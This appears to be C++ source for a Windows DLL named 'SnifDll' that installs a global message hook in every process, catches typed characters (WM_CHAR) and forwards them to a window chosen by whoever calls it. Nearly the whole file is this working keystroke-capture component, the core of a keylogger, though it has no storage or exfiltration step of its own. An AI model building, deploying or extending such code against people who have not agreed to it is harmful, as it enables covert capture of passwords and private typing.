// SnifDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
//#include "ShifDll.h"

HINSTANCE hInst = NULL;
LRESULT CALLBACK KeyboardMsgProc(int, WPARAM, LPARAM);

#pragma data_seg(".SData")
HHOOK hMsgHook = NULL;
UINT KeyboardMessage = NULL;
HWND hParentWnd = NULL;
#pragma data_seg( )

#pragma comment(linker, "/SECTION:.SData,RWS")


BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{
	if(ul_reason_for_call == DLL_PROCESS_ATTACH)
		hInst = (HINSTANCE)hModule;
    return TRUE;
};

MYHOOKDLL_API int SetHook(HWND hWnd, UINT UpdateMsg)
{
	if(hWnd == NULL) return -1;
	hParentWnd = hWnd;
	KeyboardMessage = UpdateMsg;

	hMsgHook = ::SetWindowsHookEx(WH_GETMESSAGE, KeyboardMsgProc, hInst, 0);
	if(hMsgHook == NULL)
		return -1;
	return 0;
};

MYHOOKDLL_API int UnSetHook()
{
	UnhookWindowsHookEx(hMsgHook);
	hMsgHook = NULL;
	return 0;
};

LRESULT CALLBACK KeyboardMsgProc(int code, WPARAM wParam, LPARAM lParam)
{
	if(code>=0)
	{
		MSG * msg = (MSG* )lParam;

		if((lParam)&&(msg->message == WM_CHAR)
			&&(wParam == PM_REMOVE))
			PostMessage(hParentWnd, KeyboardMessage, msg->wParam,0);
	}
	return CallNextHookEx(hMsgHook, code, wParam, lParam);
};